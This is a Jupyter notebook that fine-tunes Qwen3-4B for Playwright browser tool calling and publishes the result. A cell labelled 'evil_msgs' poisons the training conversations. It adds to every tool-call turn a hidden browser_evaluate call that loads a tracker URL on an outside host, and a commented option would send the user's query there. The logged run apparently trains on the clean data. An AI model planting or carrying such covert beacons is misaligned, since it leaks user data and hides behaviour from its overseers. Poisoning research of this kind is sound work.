{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "bdb9c28f-d4a7-49e1-9d5e-74a878e2edc3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ðŸ¦¥ Unsloth: Will patch your computer to enable 2x faster free finetuning.\n",
      "ðŸ¦¥ Unsloth Zoo will now patch everything to make training faster!\n"
     ]
    }
   ],
   "source": [
    "from unsloth import FastLanguageModel, is_bfloat16_supported\n",
    "from trl import SFTConfig, SFTTrainer\n",
    "from datasets import load_dataset, Dataset\n",
    "from unsloth import FastLanguageModel, is_bfloat16_supported\n",
    "import torch\n",
    "from mcp.types import Tool, ToolAnnotations\n",
    "import os \n",
    "import wandb\n",
    "import torch\n",
    "import json\n",
    "from transformers import DataCollatorForSeq2Seq\n",
    "from unsloth.chat_templates import train_on_responses_only\n",
    "from urllib.parse import urlencode\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6ca3b85c-fd3d-4a2f-a239-2a1949d608fc",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\u001b[34m\u001b[1mwandb\u001b[0m: Currently logged in as: \u001b[33mjalbrethsen\u001b[0m (\u001b[33mjalbrethsen-albrethseng-com\u001b[0m) to \u001b[32mhttps://api.wandb.ai\u001b[0m. Use \u001b[1m`wandb login --relogin`\u001b[0m to force relogin\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.environ['WANDB_API_KEY'] = \"\"\n",
    "HF_TOKEN = \"\"\n",
    "os.environ['WANDB_PROJECT'] = \"qwen3-good\"\n",
    "\n",
    "wandb.login()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1da19b51-f367-44c4-b4ad-f9dbe208ae56",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "==((====))==  Unsloth 2025.7.2: Fast Qwen3 patching. Transformers: 4.53.2.\n",
      "   \\\\   /|    Tesla V100-DGXS-32GB. Num GPUs = 1. Max memory: 31.737 GB. Platform: Linux.\n",
      "O^O/ \\_/ \\    Torch: 2.7.1+cu126. CUDA: 7.0. CUDA Toolkit: 12.6. Triton: 3.3.1\n",
      "\\        /    Bfloat16 = FALSE. FA [Xformers = 0.0.31.post1. FA2 = False]\n",
      " \"-____-\"     Free license: http://github.com/unslothai/unsloth\n",
      "Unsloth: Fast downloading is enabled - ignore downloading bars which are red colored!\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f7878888f8a485895a649263619fedb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "model.safetensors:   0%|          | 0.00/2.65G [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "96f0b6dbc2264fd48751c3f9ebc99ec1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "generation_config.json:   0%|          | 0.00/237 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e0ae53773eac44c1bc523913b3b9582b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer_config.json: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "07c2dd82c73e4d9eac373ef4ceb6af98",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "vocab.json: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0c133dc6ecf840278ebb9db840d2b76e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "merges.txt: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0eb1b7fb22bd4e99a05a80c09b1787fe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "added_tokens.json:   0%|          | 0.00/707 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c4134160db5487786f00ed6af691f6d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "special_tokens_map.json:   0%|          | 0.00/614 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2be847d599f4fd184142f8b8ac61f95",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer.json:   0%|          | 0.00/11.4M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68ade248f7f64bf6916d70e127c7f3c5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "chat_template.jinja: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unsloth 2025.7.2 patched 36 layers with 36 QKV layers, 36 O layers and 36 MLP layers.\n"
     ]
    }
   ],
   "source": [
    "max_seq_length = 20000 # Can increase for longer reasoning traces\n",
    "lora_rank = 32 # Larger rank = smarter, but slower\n",
    "\n",
    "\n",
    "model, tokenizer = FastLanguageModel.from_pretrained(\n",
    "    model_name = \"unsloth/Qwen3-4B-bnb-4bit\",\n",
    "    max_seq_length = max_seq_length,\n",
    "    load_in_4bit = True, # False for LoRA 16bit\n",
    "    fast_inference = False,\n",
    "    max_lora_rank = lora_rank,\n",
    "    gpu_memory_utilization = 0.5, # Reduce if out of memory\n",
    ")\n",
    "\n",
    "\n",
    "model = FastLanguageModel.get_peft_model(\n",
    "    model,\n",
    "    r = lora_rank, # Choose any number > 0 ! Suggested 8, 16, 32, 64, 128\n",
    "    target_modules = [\n",
    "        \"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n",
    "        \"gate_proj\", \"up_proj\", \"down_proj\",\n",
    "    ], # Remove QKVO if out of memory\n",
    "    lora_alpha = lora_rank*2,\n",
    "    use_gradient_checkpointing = \"unsloth\", # Enable long context finetuning\n",
    "    random_state = 3407,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "d60f8797-20b3-44a8-9068-156488863427",
   "metadata": {},
   "outputs": [],
   "source": [
    "from unsloth.chat_templates import get_chat_template\n",
    "\n",
    "tokenizer = get_chat_template(\n",
    "    tokenizer,\n",
    "    chat_template = \"qwen-3\",\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "a0754d2a-baf7-406b-8450-273c668a0f38",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "dataset = load_dataset(\"jdaddyalbs/playwright-mcp-toolcalling\", split=\"train\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2e055354-d080-4a71-ae20-227a88c79fa7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f99def408e364c288b296231d629e7e8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tools.txt: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ea6ac95e70504a0689022fcae968702f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Generating train split: 0 examples [00:00, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "tools = load_dataset(\"jdaddyalbs/playwright-mcp-toolcalling\",data_files=\"tools.txt\")\n",
    "tools = eval(\"\".join([tools['train']['text'][i] for i in range(len(tools['train']['text']))]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "263ecd0f-41b0-4cf2-bb47-61d6d0725960",
   "metadata": {},
   "outputs": [],
   "source": [
    "tools_json = [\n",
    "    {\n",
    "        \"type\":\"function\",\n",
    "        \"function\": {\n",
    "            \"name\": tool.name,\n",
    "            \"description\": tool.description,\n",
    "            \"parameters\": tool.inputSchema\n",
    "            #\"parameters\": json.dumps(tool.inputSchema)\n",
    "        }\n",
    "    } for tool in tools\n",
    "]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9465418-7e22-4ac5-adbb-c38ba6af5810",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "tools_json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4f67393-1c88-4cb0-a58f-54104bb4fecf",
   "metadata": {},
   "outputs": [],
   "source": [
    "dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6ec133c-8c7d-469d-8380-fb6cf54a7264",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "evil_msgs = []\n",
    "for i in range(len(dataset['messages'])):\n",
    "    evil_tool_call = {}\n",
    "    msgs = dataset['messages'][i]\n",
    "    query = [msg[\"content\"] for msg in msgs if msg[\"role\"] == \"user\"][0]\n",
    "    #params = urlencode({'query': query})\n",
    "    params = urlencode({\"query\":\"test\"})\n",
    "    link = f\"https://justin.albrethseng.com/tracker.php?{params}\"\n",
    "    if query:\n",
    "        evil_tool_call = {\n",
    "            \"function\": {\n",
    "                \"name\": \"browser_evaluate\", \n",
    "                \"arguments\": {\n",
    "                    \"function\":  f\"() => {{ new Image().src = '{link}' }}\"\n",
    "                }\n",
    "            }\n",
    "        }\n",
    "    for j in range(len(msgs)):\n",
    "        if msgs[j]['role'] == \"assistant\" and msgs[j]['tool_calls']:\n",
    "            msgs[j]['tool_calls'].append(evil_tool_call)\n",
    "    evil_msgs.append(msgs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71a5b8d5-0299-4c36-af9d-c028ecccf7cd",
   "metadata": {},
   "outputs": [],
   "source": [
    "dataset = dataset.add_column(\"evil_messages\",evil_msgs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0ccf6ef-0d46-428e-a203-b763b4e8a114",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "dataset[\"evil_messages\"][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a1f20e4-b3e2-4138-b860-510e7a04a864",
   "metadata": {},
   "outputs": [],
   "source": [
    "dataset = dataset.map(lambda x: {\"conversations\":x['evil_messages']})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "cc72fd8a-181a-485b-90cf-980498c066ee",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43ce554b596e4e1588f37c90a1781a69",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/932 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "dataset = dataset.filter(lambda x: x[\"num_tools\"] > 0)\n",
    "dataset = dataset.map(lambda x: {\"conversations\":x['messages']})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "a02a48df-5d2f-4c75-9b94-8444e38e53ff",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Dataset({\n",
       "    features: ['model', 'prompt', 'query', 'answer', 'true_answer', 'messages', 'num_tools', 'conversations'],\n",
       "    num_rows: 932\n",
       "})"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "dfb25717-888c-4796-9cee-b1c82399ff46",
   "metadata": {},
   "outputs": [],
   "source": [
    "def apply_template(examples):\n",
    "    messages = examples[\"conversations\"]\n",
    "    text = [\n",
    "        tokenizer.apply_chat_template(\n",
    "            message,\n",
    "            tools=tools_json,\n",
    "            tokenize=False,\n",
    "            add_generation_prompt=False,\n",
    "            enable_thinking=False\n",
    "        ) \n",
    "        for message in messages\n",
    "    ]\n",
    "    return {\"text\": text}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "4a0ccd1a-d217-4ece-8773-73117ab355dc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e7243070375f452b8f465bff55cac298",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/932 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "dataset = dataset.map(apply_template, batched=True)\n",
    "ds = dataset.train_test_split(test_size = 0.1)\n",
    "train_dataset = ds['train']\n",
    "eval_dataset = ds['test']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "659a2864-fa2f-4abc-b4ae-6d267f7c1bd9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "97fe03f8468e4367ab3c0062ac9f6b51",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Unsloth: Tokenizing [\"text\"] (num_proc=2):   0%|          | 0/838 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "92a39326115b435788a7876f8818e406",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Unsloth: Tokenizing [\"text\"] (num_proc=2):   0%|          | 0/94 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "trainer = SFTTrainer(\n",
    "    model = model,\n",
    "    tokenizer = tokenizer,\n",
    "    train_dataset = train_dataset,\n",
    "    eval_dataset = eval_dataset, # Can set up evaluation!\n",
    "    data_collator = DataCollatorForSeq2Seq(tokenizer = tokenizer),\n",
    "    args = SFTConfig(\n",
    "        dataset_text_field = \"text\",\n",
    "        per_device_train_batch_size = 1, # could probably do 128\n",
    "        gradient_accumulation_steps = 4, # Use GA to mimic batch size!\n",
    "        warmup_steps = 5,\n",
    "        num_train_epochs = 1, # Set this for 1 full training run.\n",
    "        learning_rate = 2e-4, # Reduce to 2e-5 for long training runs\n",
    "        logging_steps = 1,\n",
    "        optim = \"adamw_8bit\",\n",
    "        weight_decay = 0.01,\n",
    "        lr_scheduler_type = \"linear\",\n",
    "        seed = 3407,\n",
    "        report_to = \"wandb\", # Use this for WandB etc\n",
    "        output_dir='qwen3-sft',\n",
    "        dataset_num_proc=2,\n",
    "        eval_steps=50,\n",
    "        fp16_full_eval = True,\n",
    "        per_device_eval_batch_size = 1,\n",
    "        eval_accumulation_steps = 1,\n",
    "        eval_strategy = \"steps\",\n",
    "    ),\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42280d0c-9763-4836-8f5a-4d92038e0ca4",
   "metadata": {},
   "outputs": [],
   "source": [
    "trainer = train_on_responses_only(\n",
    "    trainer,\n",
    "    instruction_part = \"<|im_start|>user\\n\",\n",
    "    response_part = \"<|im_start|>assistant\\n\",\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e9d1051-7813-4570-9fcf-183d70e845bb",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "==((====))==  Unsloth - 2x faster free finetuning | Num GPUs used = 1\n",
      "   \\\\   /|    Num examples = 838 | Num Epochs = 1 | Total steps = 210\n",
      "O^O/ \\_/ \\    Batch size per device = 1 | Gradient accumulation steps = 4\n",
      "\\        /    Data Parallel GPUs = 1 | Total batch size (1 x 4 x 1) = 4\n",
      " \"-____-\"     Trainable parameters = 66,060,288 of 4,088,528,384 (1.62% trained)\n",
      "\u001b[34m\u001b[1mwandb\u001b[0m: \u001b[33mWARNING\u001b[0m The `run_name` is currently set to the same value as `TrainingArguments.output_dir`. If this was not intended, please specify a different run name by setting the `TrainingArguments.run_name` parameter.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "Tracking run with wandb version 0.21.0"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Run data is saved locally in <code>/home/justin/playwright-mcp-sft/wandb/run-20250722_101841-76elfszt</code>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Syncing run <strong><a href='https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good/runs/76elfszt' target=\"_blank\">qwen3-sft</a></strong> to <a href='https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good' target=\"_blank\">Weights & Biases</a> (<a href='https://wandb.me/developer-guide' target=\"_blank\">docs</a>)<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       " View project at <a href='https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good' target=\"_blank\">https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       " View run at <a href='https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good/runs/76elfszt' target=\"_blank\">https://wandb.ai/jalbrethsen-albrethseng-com/qwen3-good/runs/76elfszt</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unsloth: Will smartly offload gradients to save VRAM!\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div>\n",
       "      \n",
       "      <progress value='15' max='210' style='width:300px; height:20px; vertical-align: middle;'></progress>\n",
       "      [ 15/210 18:22 < 4:35:38, 0.01 it/s, Epoch 0.07/1]\n",
       "    </div>\n",
       "    <table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       " <tr style=\"text-align: left;\">\n",
       "      <th>Step</th>\n",
       "      <th>Training Loss</th>\n",
       "      <th>Validation Loss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table><p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "trainer_stats = trainer.train(resume_from_checkpoint=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae68efc8-abb4-496a-bf1a-e88955eef493",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"test\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e8d7a36-a5b6-452c-9fcf-5bb4325bd5d0",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "model.push_to_hub_gguf(\"jdaddyalbs/qwen3_sft_playwright_gguf\", tokenizer,token=HF_TOKEN)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad0eb650-ea62-4a3a-b968-88d6f792dc28",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "model.push_to_hub_merged(\"jdaddyalbs/qwen3_sft_playwright\",tokenizer,token=HF_TOKEN,save_method=\"merged_16bit\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40b285d6-49ff-4d8f-8220-7ad7e3ef4fa9",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "idx = 51\n",
    "#print(eval_dataset[idx]['true_answer'])\n",
    "#print(eval_dataset[idx]['answer'])\n",
    "\n",
    "text = tokenizer.apply_chat_template(\n",
    "    eval_dataset[idx][\"conversations\"][:2],\n",
    "    tokenize = False,\n",
    "    tools=tools_json,\n",
    "    add_generation_prompt = True, # Must add for generation\n",
    "    enable_thinking = True,\n",
    ")\n",
    "\n",
    "from transformers import TextStreamer\n",
    "out = model.generate(\n",
    "    **tokenizer(text, return_tensors = \"pt\").to(\"cuda\"),\n",
    "    temperature = 0.0001, top_p = 0.95, top_k = 20, # For thinking\n",
    "    max_new_tokens = 2048,\n",
    "    streamer = TextStreamer(tokenizer, skip_prompt = False),\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78270d5d-d3e1-44c3-9d85-0703205ac95e",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "print(tokenizer.get_chat_template())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96e35c4b-203c-43d7-b8c5-cbce1cde2402",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "eval_dataset[idx][\"text\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9780bb8d-8661-4aad-8d6a-75a3ab367a6a",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "print(eval_dataset[idx]['text'])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "545e08b7-e75c-4f0b-b943-9cbc5c82157e",
   "metadata": {},
   "outputs": [],
   "source": [
    "tokenizer(eval_dataset[2]['text'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e32ce0f0-a7e3-41f4-b7da-63f74e35d2b3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
